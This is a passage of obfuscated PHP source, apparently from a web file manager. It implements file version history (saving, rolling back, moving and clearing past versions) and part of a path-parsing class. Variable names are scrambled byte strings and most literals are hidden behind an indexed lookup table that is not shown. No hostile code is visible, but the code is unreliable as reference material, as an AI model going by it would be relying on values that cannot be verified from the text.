Hook::bind($¯îöÓÆ[1279], $¯îöÓÆ[1280]); Hook::bind($¯îöÓÆ[1281], $¯îöÓÆ[1282]); Hook::bind($¯îöÓÆ[1283], $¯îöÓÆ[1284]); Hook::bind($¯îöÓÆ[1285], $¯îöÓÆ[1286]); Hook::bind($¯îöÓÆ[1287], $¯îöÓÆ[1288]); Hook::bind($¯îöÓÆ[1289], $¯îöÓÆ[1290]); } public static function eventBeforeUpload($¦‘¹ö¦) { if ($¦‘¹ö¦[3] && $¦‘¹ö¦[3] != REPEAT_REPLACE) { return; } $ŞÚ±ıÒ = self::parsePath($¦‘¹ö¦[0]); if (!$ŞÚ±ıÒ) { return; } self::add($ŞÚ±ıÒ); } public static function eventBeforeEdit($çù‚’…Ó) { $Û€Ÿ§Üß = self::parsePath($çù‚’…Ó[0]); if (!$Û€Ÿ§Üß) { return; } self::add($Û€Ÿ§Üß); } public static function eventBeforeCopyFile($ñÏÀŒÂæ, $™¼ßÛ¿ß, $ôà„Û“Í, $Ë©‰Åİ®, $Î—’„, $™·Â‰°å) { $ ‡Í›ç¦ =& $_SERVER[è¶³ÒßÑ]; if (isset($ôà„Û“Í->_data[$ ‡Í›ç¦[1211]]) && $ôà„Û“Í->_data[$ ‡Í›ç¦[1211]]) { return; } $‚“ÈÍ¸¬ = $ôà„Û“Í->getPathOuter($Ë©‰Åİ®); $šÚÒ©¤ß = self::parsePath($‚“ÈÍ¸¬); if (!$šÚÒ©¤ß) { return; } self::add($šÚÒ©¤ß); } public static function eventBeforeRename($”àîß°ä) { $ı¼½·ã¿ =& $_SERVER[è¶³ÒßÑ]; $û–Ì’´ = self::parsePath($”àîß°ä[0]); if (!$û–Ì’´) { return; } $…®¹¹ª = self::checkInHistory($û–Ì’´); if (!$…®¹¹ª) { return; } if ($…®¹¹ª[$ı¼½·ã¿[33]] == $ı¼½·ã¿[240]) { $¼ÕãŠó¦ = self::listData($û–Ì’´); if ($¼ÕãŠó¦ && $¼ÕãŠó¦[$ı¼½·ã¿[438]]) { self::moveHistory($û–Ì’´, $”àîß°ä[1]); } } else { IO::rename($…®¹¹ª[$ı¼½·ã¿[97]], $”àîß°ä[1]); } } public static function eventBeforeMove($§ÆØŠê) { $Çí•àª´ =& $_SERVER[è¶³ÒßÑ]; $š“¹¥†ü = self::parsePath($§ÆØŠê[0]); if (!$š“¹¥†ü) { return; } $ø„Ä„ = self::parsePath($§ÆØŠê[1]); if (!$ø„Ä„) { return; } $€È—È†û = $§ÆØŠê[3]; $ÖÛˆô£ã = self::checkInHistory($š“¹¥†ü); if (!$ÖÛˆô£ã) { return; } $¤ÆŸªÇ„ = self::pathHistory($ø„Ä„); if ($ÖÛˆô£ã[$Çí•àª´[33]] == $Çí•àª´[240]) { $â……ë£ = self::listData($š“¹¥†ü); $ô¤¿µ¿ò = rtrim($ø„Ä„, $Çí•àª´[8]) . $Çí•àª´[8] . ($€È—È†û ? $€È—È†û : get_path_this($š“¹¥†ü)); $Ê®÷Ôşò = self::listData($ô¤¿µ¿ò); if ($â……ë£ && $â……ë£[$Çí•àª´[438]] && $Ê®÷Ôşò && $Ê®÷Ôşò[$Çí•àª´[438]]) { return self::clear($š“¹¥†ü); } if ($â……ë£ && $â……ë£[$Çí•àª´[438]]) { self::moveHistory($š“¹¥†ü, $€È—È†û, $¤ÆŸªÇ„); } } else { IO::move($ÖÛˆô£ã[$Çí•àª´[97]], $¤ÆŸªÇ„, !1, $€È—È†û); self::clearEmptyFolder(IO::pathFather($ÖÛˆô£ã[$Çí•àª´[97]])); } } public static function eventAfterRemove($ø«Ò“„î, $š°²Ûë) { $®°ŠñàŒ =& $_SERVER[è¶³ÒßÑ]; if (!$š°²Ûë) { return; } $âæÈóøÏ = self::parsePath($ø«Ò“„î[0]); if (!$âæÈóøÏ) { return; } $Òëêú« = self::checkInHistory($âæÈóøÏ); if (!$Òëêú«) { return; } if ($Òëêú«[$®°ŠñàŒ[33]] == $®°ŠñàŒ[240]) { $ª±œãè¸ = self::listData($âæÈóøÏ, !1); if ($ª±œãè¸ && $ª±œãè¸[$®°ŠñàŒ[438]]) { self::clear($âæÈóøÏ, !1); } } else { IO::remove($Òëêú«[$®°ŠñàŒ[97]]); self::clearEmptyFolder(IO::pathFather($Òëêú«[$®°ŠñàŒ[97]])); } } private static function checkInHistory($Ö»Ä¢Ìƒ) { $û½âÛ—´ = self::pathHistory($Ö»Ä¢Ìƒ); if (!IO::exist($û½âÛ—´)) { $û½âÛ—´ .= $_SERVER[è¶³ÒßÑ][1291]; } return IO::exist($û½âÛ—´) ? IO::info($û½âÛ—´) : !1; } private static function parsePath($Æ¥¸ª°) { $ä©„íõÒ =& $_SERVER[è¶³ÒßÑ]; if (!$Æ¥¸ª°) { return !1; } if (isset($GLOBALS[$ä©„íõÒ[1292]]) && $GLOBALS[$ä©„íõÒ[1292]]) { return; } $­öƒ„™ü = KodIO::parse($Æ¥¸ª°); $ä‘İşÁ = $­öƒ„™ü[$ä©„íõÒ[33]]; $ÑÙ¬å¦¥ = !$ä‘İşÁ || $ä‘İşÁ == KodIO::KOD_IO || $ä‘İşÁ == KodIO::KOD_SHARE_ITEM; if (!$ÑÙ¬å¦¥ || !$­öƒ„™ü[$ä©„íõÒ[1293]]) { return !1; } if (substr($Æ¥¸ª°, 0, strlen(DATA_PATH . $ä©„íõÒ[1294])) == DATA_PATH . $ä©„íõÒ[1294]) { return !1; } if ($ä‘İşÁ == KodIO::KOD_SHARE_ITEM) { $ü‘Â¹‡ = IO::init($Æ¥¸ª°); if ($ü‘Â¹‡->pathParse[$ä©„íõÒ[1207]]) { return self::parsePath($ü‘Â¹‡->pathParse[$ä©„íõÒ[1207]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $©õñ‹ß = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ä©„íõÒ[1295]); foreach ($©õñ‹ß as $ìÔğ—¶Æ) { if (!$ä‘İşÁ && substr($Æ¥¸ª°, 0, strlen($ìÔğ—¶Æ)) == $ìÔğ—¶Æ) { return !1; } } self::log($GLOBALS[$ä©„íõÒ[1202]] . $ä©„íõÒ[1296] . $Æ¥¸ª°); return $Æ¥¸ª°; } private static function pathHistory($³°¡İâĞ) { $¸‘â½¬å =& $_SERVER[è¶³ÒßÑ]; $ê–‚É¦ù = self::$_historyBase . ltrim(KodIO::clear($³°¡İâĞ), $¸‘â½¬å[8]); $ê–‚É¦ù = str_replace(array($¸‘â½¬å[1297]), array($¸‘â½¬å[1298]), $ê–‚É¦ù); return $ê–‚É¦ù; } public static function log($ĞŸ´÷¯¸) { } public static function historyCount($’¯ñÄª) { $ÁÒ€¡Í· =& $_SERVER[è¶³ÒßÑ]; $òïü”Ôß = array(); $ß“áğ„è = array(); foreach ($’¯ñÄª as $äŞ¦ø¾) { $üù‹Ö¬Ä = get_path_father($äŞ¦ø¾); if (!$ß“áğ„è[$üù‹Ö¬Ä]) { $ß“áğ„è[$üù‹Ö¬Ä] = array(); } $ß“áğ„è[$üù‹Ö¬Ä][] = get_path_this($äŞ¦ø¾); } foreach ($ß“áğ„è as $üù‹Ö¬Ä => $ˆòÆâ…¬) { $¾‰ó³íô = self::parsePath($üù‹Ö¬Ä); if (!$¾‰ó³íô) { continue; } foreach ($ˆòÆâ…¬ as $şä”ÙØğ) { $ºÑ™ÛÔÑ = self::listData(rtrim($¾‰ó³íô, $ÁÒ€¡Í·[8]) . $ÁÒ€¡Í·[8] . $şä”ÙØğ, !1); if ($ºÑ™ÛÔÑ && $ºÑ™ÛÔÑ[$ÁÒ€¡Í·[438]]) { $òïü”Ôß[rtrim($üù‹Ö¬Ä, $ÁÒ€¡Í·[8]) . $ÁÒ€¡Í·[8] . $şä”ÙØğ] = count($ºÑ™ÛÔÑ[$ÁÒ€¡Í·[438]]); } } } return $òïü”Ôß; } public static function add($àÊÓ¨Æ£) { $£¼ƒ©‚Ğ =& $_SERVER[è¶³ÒßÑ]; $ü½—‘Ä¦ = self::listData($àÊÓ¨Æ£); if (!$ü½—‘Ä¦) { return; } $ËüñùüÁ = Model($£¼ƒ©‚Ğ[824])->get($£¼ƒ©‚Ğ[1299]); $½Â¶í‘„ = intval($GLOBALS[$£¼ƒ©‚Ğ[6]][$£¼ƒ©‚Ğ[102]][$£¼ƒ©‚Ğ[1277]]); $ÀĞÉ““Ä = $ËüñùüÁ == $£¼ƒ©‚Ğ[1300] ? min(5, $½Â¶í‘„) : $½Â¶í‘„; if ($½Â¶í‘„ <= 0) { return; } $‹ô·º›  = IO::info($àÊÓ¨Æ£); $ó€Ì‹Šì = $ü½—‘Ä¦[$£¼ƒ©‚Ğ[438]]; if ($‹ô·º› [$£¼ƒ©‚Ğ[89]] == 0) { return; } if ($‹ô·º› [$£¼ƒ©‚Ğ[89]] >= 1024 * 1024 * 500) { return !1; } $èíêÔ‚— = IO::hashSimple($àÊÓ¨Æ£); if ($ó€Ì‹Šì && $ó€Ì‹Šì[0][$£¼ƒ©‚Ğ[665]] == $èíêÔ‚—) { return !0; } if (array_key_exists($£¼ƒ©‚Ğ[243], $‹ô·º› ) && !$‹ô·º› [$£¼ƒ©‚Ğ[243]]) { return !1; } $øÚÏ±Æ = short_id(time()); $ÄáÉÈÚø = array($£¼ƒ©‚Ğ[468] => $øÚÏ±Æ, $£¼ƒ©‚Ğ[665] => $èíêÔ‚—, $£¼ƒ©‚Ğ[32] => $‹ô·º› [$£¼ƒ©‚Ğ[32]] . $£¼ƒ©‚Ğ[10] . date($£¼ƒ©‚Ğ[1301]) . rand_string(1), $£¼ƒ©‚Ğ[89] => $‹ô·º› [$£¼ƒ©‚Ğ[89]], $£¼ƒ©‚Ğ[520] => USER_ID, $£¼ƒ©‚Ğ[241] => time(), $£¼ƒ©‚Ğ[1302] => $£¼ƒ©‚Ğ[12]); IO::mkdir($ü½—‘Ä¦[$£¼ƒ©‚Ğ[1303]]); $Œ°°…‚Û = IO::copy($àÊÓ¨Æ£, $ü½—‘Ä¦[$£¼ƒ©‚Ğ[1303]], !1, $ÄáÉÈÚø[$£¼ƒ©‚Ğ[32]]); if (!$Œ°°…‚Û) { self::clearEmptyFolder($ü½—‘Ä¦[$£¼ƒ©‚Ğ[1303]]); return !1; } array_unshift($ó€Ì‹Šì, $ÄáÉÈÚø); if (count($ó€Ì‹Šì) > $ÀĞÉ““Ä) { $—Ãœí›å = array_slice($ó€Ì‹Šì, $ÀĞÉ““Ä); foreach ($—Ãœí›å as $ı¨«‰€Š) { IO::remove($ü½—‘Ä¦[$£¼ƒ©‚Ğ[1303]] . $ı¨«‰€Š[$£¼ƒ©‚Ğ[32]]); } $ó€Ì‹Šì = array_slice($ó€Ì‹Šì, 0, $ÀĞÉ““Ä); } return self::saveData($ü½—‘Ä¦[$£¼ƒ©‚Ğ[1304]], $ó€Ì‹Šì); } public static function remove($ôËúğ™, $ò¼Ï¿¦Û) { $ªüåÄš† =& $_SERVER[è¶³ÒßÑ]; $®—»Ó¸å = self::listData($ôËúğ™); $ë‰ôş†¸ = array(); if (!$®—»Ó¸å) { return !1; } foreach ($®—»Ó¸å[$ªüåÄš†[438]] as $˜ÕÑò»…) { if ($˜ÕÑò»…[$ªüåÄš†[468]] == $ò¼Ï¿¦Û) { IO::remove($®—»Ó¸å[$ªüåÄš†[1303]] . $˜ÕÑò»…[$ªüåÄš†[32]]); continue; } $ë‰ôş†¸[] = $˜ÕÑò»…; } return self::saveData($®—»Ó¸å[$ªüåÄš†[1304]], $ë‰ôş†¸); } public static function clear($çøğ‘şö, $÷Â”„Ë¤ = true) { $¼‘±¤¤å =& $_SERVER[è¶³ÒßÑ]; $®–¿±‘ = self::listData($çøğ‘şö, $÷Â”„Ë¤); if (!$®–¿±‘) { return !1; } foreach ($®–¿±‘[$¼‘±¤¤å[438]] as $è­øäŠï) { IO::remove($®–¿±‘[$¼‘±¤¤å[1303]] . $è­øäŠï[$¼‘±¤¤å[32]]); } return self::saveData($®–¿±‘[$¼‘±¤¤å[1304]], array()); } public static function moveHistory($²†Åì“”, $üŒŒ‹Ë = '', $ü‘´‡¡ù = '') { $ÄÕœªîĞ =& $_SERVER[è¶³ÒßÑ]; $™í¨ÑƒÃ = self::listData($²†Åì“”, !1); if (!$™í¨ÑƒÃ || !$™í¨ÑƒÃ[$ÄÕœªîĞ[438]]) { return !1; } $¯„Ñ’Ú = $ÄÕœªîĞ[1291]; $üŒŒ‹Ë = $üŒŒ‹Ë ? $üŒŒ‹Ë : get_path_this($²†Åì“”); $ü‘´‡¡ù = $ü‘´‡¡ù ? $ü‘´‡¡ù : $™í¨ÑƒÃ[$ÄÕœªîĞ[1303]]; $øÑªşäË = substr(get_path_this($™í¨ÑƒÃ[$ÄÕœªîĞ[1304]]), 0, -strlen($¯„Ñ’Ú)); foreach ($™í¨ÑƒÃ[$ÄÕœªîĞ[438]] as $©úµŠ§ => $ŒÊÚŒë) { $ÓƒûÄÜ = $üŒŒ‹Ë . substr($ŒÊÚŒë[$ÄÕœªîĞ[32]], strlen($øÑªşäË)); $¯è·ñ™‰ = IO::move($™í¨ÑƒÃ[$ÄÕœªîĞ[1303]] . $ŒÊÚŒë[$ÄÕœªîĞ[32]], $ü‘´‡¡ù, !1, $ÓƒûÄÜ); if ($¯è·ñ™‰) { $™í¨ÑƒÃ[$ÄÕœªîĞ[438]][$©úµŠ§][$ÄÕœªîĞ[32]] = $ÓƒûÄÜ; } } $™í¨ÑƒÃ[$ÄÕœªîĞ[1304]] = IO::move($™í¨ÑƒÃ[$ÄÕœªîĞ[1304]], $ü‘´‡¡ù, !1, $üŒŒ‹Ë . $¯„Ñ’Ú); self::saveData($™í¨ÑƒÃ[$ÄÕœªîĞ[1304]], $™í¨ÑƒÃ[$ÄÕœªîĞ[438]]); self::clearEmptyFolder($™í¨ÑƒÃ[$ÄÕœªîĞ[1303]]); } public static function rollback($öåÔòö, $á»äÁË¡) { $€ıÜÁÆ„ =& $_SERVER[è¶³ÒßÑ]; $ˆË´‚á÷ = self::listData($öåÔòö); if (!$ˆË´‚á÷) { return; } $å¾…äÙ¬ = IO::info($öåÔòö); foreach ($ˆË´‚á÷[$€ıÜÁÆ„[438]] as $û·àÁÌ¥ => $‡Æ£Í) { if ($‡Æ£Í[$€ıÜÁÆ„[468]] == $á»äÁË¡) { self::add($öåÔòö); $ÀŠÉÑºÊ = $ˆË´‚á÷[$€ıÜÁÆ„[1303]] . $‡Æ£Í[$€ıÜÁÆ„[32]]; $ç¡õ = IO::copy($ÀŠÉÑºÊ, IO::pathFather($öåÔòö), REPEAT_REPLACE, $å¾…äÙ¬[$€ıÜÁÆ„[32]]); if ($ç¡õ) { self::remove($öåÔòö, $á»äÁË¡); } return $ç¡õ; } } return !1; } public static function setDetail($Ï„—¸¶ä, $æ±°Ó‡Ë, $´¶Ÿí«) { $‹»şÌü =& $_SERVER[è¶³ÒßÑ]; $¶ŒæÄê = self::listData($Ï„—¸¶ä); if (!$¶ŒæÄê) { return; } foreach ($¶ŒæÄê[$‹»şÌü[438]] as $´„£—Š² => $ğÎ³íí) { if ($ğÎ³íí[$‹»şÌü[468]] == $æ±°Ó‡Ë) { $¶ŒæÄê[$‹»şÌü[438]][$´„£—Š²][$‹»şÌü[1302]] = $´¶Ÿí«; self::saveData($¶ŒæÄê[$‹»şÌü[1304]], $¶ŒæÄê[$‹»şÌü[438]]); return !0; } } return !1; } public static function fileInfo($ÔÙ«×˜, $„»şÛÅñ) { $¹™ë¿Îä =& $_SERVER[è¶³ÒßÑ]; $ùşŠôˆ = self::listData($ÔÙ«×˜); if (!$ùşŠôˆ) { show_json(LNG($¹™ë¿Îä[118]), !1); } $º¾›ˆíÚ = $¹™ë¿Îä[12]; foreach ($ùşŠôˆ[$¹™ë¿Îä[438]] as $¬›¶„ÙÇ => $­†•¤å¡) { if ($­†•¤å¡[$¹™ë¿Îä[468]] != $„»şÛÅñ) { continue; } $º¾›ˆíÚ = $ùşŠôˆ[$¹™ë¿Îä[1303]] . $­†•¤å¡[$¹™ë¿Îä[32]]; break; } if (!$º¾›ˆíÚ) { show_json(LNG($¹™ë¿Îä[118]), !1); } return IO::info($º¾›ˆíÚ); } public static function fileOut($ „êöæ®, $ôá±±Ñ, $Ù¹Ÿø™² = false) { $Úºû¾è„ =& $_SERVER[è¶³ÒßÑ]; $‹ªùÃı– = self::fileInfo($ „êöæ®, $ôá±±Ñ); $ È²Ñ÷í =& $GLOBALS[$Úºû¾è„[7]]; $Ù¹Ÿø™² = isset($ È²Ñ÷í[$Úºû¾è„[1254]]) && $ È²Ñ÷í[$Úºû¾è„[1254]] == 1; if (isset($ È²Ñ÷í[$Úºû¾è„[33]]) && $ È²Ñ÷í[$Úºû¾è„[33]] == $Úºû¾è„[1305]) { return IO::fileOutImage($‹ªùÃı–[$Úºû¾è„[97]], $ È²Ñ÷í[$Úºû¾è„[1306]]); } IO::fileOut($‹ªùÃı–[$Úºû¾è„[97]], $Ù¹Ÿø™², get_path_this($ „êöæ®)); } public static function listData($ ú›˜å‚, $›·¨á‹ = true) { $·‹¬êˆù =& $_SERVER[è¶³ÒßÑ]; if ($›·¨á‹ && !IO::exist($ ú›˜å‚)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ ú›˜å‚, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $¸Š«›™¹ = self::pathHistory($ ú›˜å‚); $¦ØïÁ„ƒ = array($·‹¬êˆù[1304] => $¸Š«›™¹ . $·‹¬êˆù[1291], $·‹¬êˆù[1303] => rtrim(get_path_father($¸Š«›™¹), $·‹¬êˆù[8]) . $·‹¬êˆù[8], $·‹¬êˆù[438] => array()); $ª—×Æ¹ = IO::getContent($¦ØïÁ„ƒ[$·‹¬êˆù[1304]]); if ($ª—×Æ¹) { $‹ú´‰öæ = json_decode($ª—×Æ¹, !0); if (is_array($‹ú´‰öæ)) { $¦ØïÁ„ƒ[$·‹¬êˆù[438]] = $‹ú´‰öæ; } } return $¦ØïÁ„ƒ; } private static function saveData($ùÜ•ùÇî, $·¤ã«ğ) { $Ú«×›Àñ =& $_SERVER[è¶³ÒßÑ]; self::log($Ú«×›Àñ[1307] . $ùÜ•ùÇî . $Ú«×›Àñ[84] . count($·¤ã«ğ), $Ú«×›Àñ[806]); if ($·¤ã«ğ) { return IO::setContent($ùÜ•ùÇî, json_encode($·¤ã«ğ)); } $’¡Ÿ¢ü” = IO::pathFather($ùÜ•ùÇî); IO::remove($ùÜ•ùÇî); self::clearEmptyFolder($’¡Ÿ¢ü”); return !0; } public static function clearEmptyFolder($ì°‚Ú¯·) { $éÚ°–§â =& $_SERVER[è¶³ÒßÑ]; if (trim($ì°‚Ú¯·, $éÚ°–§â[8]) == trim(self::$_historyBase, $éÚ°–§â[8])) { return; } $ØúÍ•Ú = IO::pathFather($ì°‚Ú¯·); $¤±ÖÆİâ = IO::has($ì°‚Ú¯·, !0); if ($¤±ÖÆİâ[$éÚ°–§â[249]] > 0 || $¤±ÖÆİâ[$éÚ°–§â[250]] > 0) { return; } IO::remove($ì°‚Ú¯·); self::clearEmptyFolder($ØúÍ•Ú); } private static function getBasePath() { $ÃÔÅïÀ” =& $_SERVER[è¶³ÒßÑ]; $õğ¶ Ô± = Model($ÃÔÅïÀ”[1308])->get($ÃÔÅïÀ”[1309]); if ($õğ¶ Ô±) { if (!IO::exist($õğ¶ Ô±)) { IO::mkdir($õğ¶ Ô±); } if (get_path_this($õğ¶ Ô±) == $ÃÔÅïÀ”[1294]) { $»Ú›Š¼ª = $ÃÔÅïÀ”[1310] . rand_string(8); @rename($õğ¶ Ô±, get_path_father($õğ¶ Ô±) . $ÃÔÅïÀ”[8] . $»Ú›Š¼ª); $õğ¶ Ô± = DATA_PATH . $»Ú›Š¼ª . $ÃÔÅïÀ”[8]; file_put_contents(DATA_PATH . $ÃÔÅïÀ”[1241], $ÃÔÅïÀ”[12]); Model($ÃÔÅïÀ”[1308])->set($ÃÔÅïÀ”[1309], $õğ¶ Ô±); } return $õğ¶ Ô±; } $õğ¶ Ô± = DATA_PATH . $ÃÔÅïÀ”[1310] . rand_string(8) . $ÃÔÅïÀ”[8]; $õğ¶ Ô± = IO::mkdir($õğ¶ Ô±); $õğ¶ Ô± = rtrim($õğ¶ Ô±, $ÃÔÅïÀ”[8]) . $ÃÔÅïÀ”[8]; file_put_contents($õğ¶ Ô± . $ÃÔÅïÀ”[1241], $ÃÔÅïÀ”[12]); file_put_contents(DATA_PATH . $ÃÔÅïÀ”[1241], $ÃÔÅïÀ”[12]); Model($ÃÔÅïÀ”[1308])->set($ÃÔÅïÀ”[1309], $õğ¶ Ô±); return $õğ¶ Ô±; } } class KodIO { const KOD_SOURCE = "\173\163\x6f\x75\162\x63\145\175"; const KOD_USER_RECYCLE = "\x7b\165\163\145\x72\122\x65\143\x79\143\x6c\x65\175"; const KOD_USER_FAV = "\x7b\x75\163\145\162\106\141\166\175"; const KOD_USER_FILE_TAG = "\173\x75\163\x65\162\x46\151\x6c\145\x54\x61\147\175"; const KOD_USER_FILE_TYPE = "\173\165\x73\145\162\106\151\x6c\x65\124\171\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\173\147\162\157\x75\x70\122\x6f\157\164\123\x65\x6c\x66\x7d"; const KOD_USER_SHARE = "\173\165\x73\145\162\x53\150\x61\162\x65\175"; const KOD_USER_SHARE_LINK = "\x7b\x75\163\145\x72\123\x68\141\162\x65\x4c\151\x6e\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\150\141\x72\x65\x54\157\115\145\x7d"; const KOD_SHARE_ITEM = "\x7b\163\150\x61\162\145\111\x74\x65\155\x7d"; const KOD_SHARE_LINK = "\x7b\x73\x68\x61\x72\145\111\164\145\x6d\114\151\x6e\153\175"; const KOD_SEARCH = "\x7b\163\145\141\x72\x63\x68\x7d"; const KOD_BLOCK = "\173\142\154\157\143\153\x7d"; const KOD_IO = "\173\151\157\x7d"; const KOD_USER_RECENT = "\x7b\165\x73\x65\x72\122\145\156\143\145\x6e\164\175"; const KOD_USER_DRIVER = "\x7b\x64\162\151\166\x65\162\x7d"; public static function typeList() { $åÈêÉ =& $_SERVER[è¶³ÒßÑ]; return array($åÈêÉ[1311] => self::KOD_SOURCE, $åÈêÉ[1312] => self::KOD_USER_RECYCLE, $åÈêÉ[1313] => self::KOD_USER_FAV, $åÈêÉ[1314] => self::KOD_USER_FILE_TAG, $åÈêÉ[1315] => self::KOD_USER_FILE_TYPE, $åÈêÉ[1316] => self::KOD_GROUP_ROOT_SELF, $åÈêÉ[1317] => self::KOD_USER_SHARE, $åÈêÉ[1318] => self::KOD_USER_SHARE_LINK, $åÈêÉ[1319] => self::KOD_USER_SHARE_TO_ME, $åÈêÉ[1320] => self::KOD_SHARE_ITEM, $åÈêÉ[1321] => self::KOD_SHARE_LINK, $åÈêÉ[1322] => self::KOD_SEARCH, $åÈêÉ[1323] => self::KOD_BLOCK, $åÈêÉ[1324] => self::KOD_IO, $åÈêÉ[1325] => self::KOD_USER_RECENT, $åÈêÉ[1326] => self::KOD_USER_DRIVER); } public static function parse($ğéš˜çò) { $ÉÃ’Òİ =& $_SERVER[è¶³ÒßÑ]; $ğéš˜çò = self::clear($ğéš˜çò); $æÙœ§ = array_values(self::typeList()); preg_match($ÉÃ’Òİ[1327], $ğéš˜çò, $Îœ¹ïòß); $•Á¡ÜÄ¡ = array($ÉÃ’Òİ[489] => !1, $ÉÃ’Òİ[1328] => !1, $ÉÃ’Òİ[486] => !1, $ÉÃ’Òİ[97] => $ğéš˜çò, $ÉÃ’Òİ[1226] => !1, $ÉÃ’Òİ[1225] => $ÉÃ’Òİ[12]); if (is_array($Îœ¹ïòß) && count($Îœ¹ïòß) == 5) { $¸ÂÈš“À = $ÉÃ’Òİ[1329] . $Îœ¹ïòß[2] . $ÉÃ’Òİ[396]; if (in_array($¸ÂÈš“À, $æÙœ§)) { $•Á¡ÜÄ¡[$ÉÃ’Òİ[1226]] = $Îœ¹ïòß[1]; $•Á¡ÜÄ¡[$ÉÃ’Òİ[33]] = $¸ÂÈš“À; $•Á¡ÜÄ¡[$ÉÃ’Òİ[1330]] = substr($¸ÂÈš“À, 1, -1); $•Á¡ÜÄ¡[$ÉÃ’Òİ[468]] = $Îœ¹ïòß[3]; } $•Á¡ÜÄ¡[$ÉÃ’Òİ[1225]] = $Îœ¹ïòß[4]; } $¿ú¤…Ï¯ = array($ÉÃ’Òİ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $•Á¡ÜÄ¡[$ÉÃ’Òİ[1293]] = in_array($•Á¡ÜÄ¡[$ÉÃ’Òİ[33]], $¿ú¤…Ï¯); return $•Á¡ÜÄ¡; } public static function isTruePath($”¿­Ğ®Œ) { $Æ¤­Û¥î =& $_SERVER[è¶³ÒßÑ]; if (substr($”¿­Ğ®Œ, 0, 1) != $Æ¤­Û¥î[1329]) { return !0; } if (strpos($”¿­Ğ®Œ, $Æ¤­Û¥î[476]) === 0) { return !0; } if (strpos($”¿­Ğ®Œ, $Æ¤­Û¥î[1297]) === 0) { return !0; } if (strpos($”¿­Ğ®Œ, $Æ¤­Û¥î[1331]) === 0) { return !0; } if (strpos($”¿­Ğ®Œ, $Æ¤­Û¥î[1332]) === 0) { return !0; } if (strpos($”¿­Ğ®Œ, $Æ¤­Û¥î[1333]) === 0) { return !0; } return !1; } public static function clear($ÇŒ™ŠŞ¨) { $ºŠøğÛº =& $_SERVER[è¶³ÒßÑ]; $ÇŒ™ŠŞ¨ = str_replace(array($ºŠøğÛº[1132], $ºŠøğÛº[60]), $ºŠøğÛº[53], $ÇŒ™ŠŞ¨); $ÇŒ™ŠŞ¨ = str_replace($ºŠøğÛº[110], $ºŠøğÛº[8], $ÇŒ™ŠŞ¨); $„·¦Õê˜ = $ºŠøğÛº[1334]; if (substr($ÇŒ™ŠŞ¨, 0, 3) == $ºŠøğÛº[1335]) { $ÇŒ™ŠŞ¨ = substr($ÇŒ™ŠŞ¨, 3); } while (strstr($ÇŒ™ŠŞ¨, $„·¦Õê˜)) { $ÇŒ™ŠŞ¨ = str_replace($„·¦Õê˜, $ºŠøğÛº[8], $ÇŒ™ŠŞ¨); } $ÇŒ™ŠŞ¨ = preg_replace($ºŠøğÛº[1336], $ºŠøğÛº[8], $ÇŒ™ŠŞ¨); if ($ÇŒ™ŠŞ¨ == $ºŠøğÛº[8]) { return $ºŠøğÛº[8]; } $ÇŒ™ŠŞ¨ = rtrim($ÇŒ™ŠŞ¨, $ºŠøğÛº[8]); return $ÇŒ™ŠŞ¨; } public static function pathTrue($¯Šì³™ ) { $µÓ­ÛÍ‘ =& $_SERVER[è¶³ÒßÑ]; if (!$¯Šì³™ ) { return $µÓ­ÛÍ‘[12]; } $¯Šì³™  = str_replace($µÓ­ÛÍ‘[585], $µÓ­ÛÍ‘[8], str_replace($µÓ­ÛÍ‘[1337], $µÓ­ÛÍ‘[8], $¯Šì³™ )); $¯Šì³™  = str_replace($µÓ­ÛÍ‘[585], $µÓ­ÛÍ‘[8], str_replace($µÓ­ÛÍ‘[1337], $µÓ­ÛÍ‘[8], $¯Šì³™ )); if (!strstr($¯Šì³™ , $µÓ­ÛÍ‘[1335])) { return $¯Šì³™ ; } $‡¬ã¿¯ì = explode($µÓ­ÛÍ‘[8], $¯Šì³™ ); foreach ($‡¬ã¿¯ì as $…‘Â¦Ê¥ => $±Œ’Ó) { if ($±Œ’Ó !== $µÓ­ÛÍ‘[1338]) { continue; } for ($à¯¹ğ´¦ = $…‘Â¦Ê¥; $à¯¹ğ´¦ >= 0; $à¯¹ğ´¦--) { if ($‡¬ã¿¯ì[$à¯¹ğ´¦] === $µÓ­ÛÍ‘[10] || $‡¬ã¿¯ì[$à¯¹ğ´¦] === $µÓ­ÛÍ‘[1338] || $‡¬ã¿¯ì[$à¯¹ğ´¦] === -1) { continue; } if ($‡¬ã¿¯ì[$à¯¹ğ´¦] === $µÓ­ÛÍ‘[12]) { $‡¬ã¿¯ì[$…‘Â¦Ê¥] = -1; break; } $‡¬ã¿¯ì[$…‘Â¦Ê¥] = -1; $‡¬ã¿¯ì[$à¯¹ğ´¦] = -1; break; } } $´Ì¶°Â¬ = array(); foreach ($‡¬ã¿¯ì as $±Œ’Ó) { if ($±Œ’Ó !== -1) { $´Ì¶°Â¬[] = $±Œ’Ó; } } $’¡âÌÈ = implode($µÓ­ÛÍ‘[8], $´Ì¶°Â¬); if (strpos($’¡âÌÈ, $µÓ­ÛÍ‘[1339]) === 0) { $’¡âÌÈ = $µÓ­ÛÍ‘[1335] . substr($’¡âÌÈ, strlen($µÓ­ÛÍ‘[1339])); } return $’¡âÌÈ; } public static function pathUrlClear($Â£¼Îìˆ) { $ƒÖ–´çá =& $_SERVER[è¶³ÒßÑ]; if (!$Â£¼Îìˆ) { return $Â£¼Îìˆ; } $Â£¼Îìˆ = rawurldecode($Â£¼Îìˆ); $Â£¼Îìˆ = str_replace($ƒÖ–´çá[1337], $ƒÖ–´çá[8], $Â£¼Îìˆ); if (strpos($Â£¼Îìˆ, $ƒÖ–´çá[86]) > 0) { $Â£¼Îìˆ = substr($Â£¼Îìˆ, 0, strpos($Â£¼Îìˆ, $ƒÖ–´çá[86])); } if (strpos($Â£¼Îìˆ, $ƒÖ–´çá[1340]) > 0) { $Â£¼Îìˆ = substr($Â£¼Îìˆ, 0, strpos($Â£¼Îìˆ, $ƒÖ–´çá[1340])); } return $Â£¼Îìˆ; } public static function sourceID($¯ÄîßÀé) { $’’…ñŞÉ =& $_SERVER[è¶³ÒßÑ]; $Ëã˜¡ = self::parse($¯ÄîßÀé); if 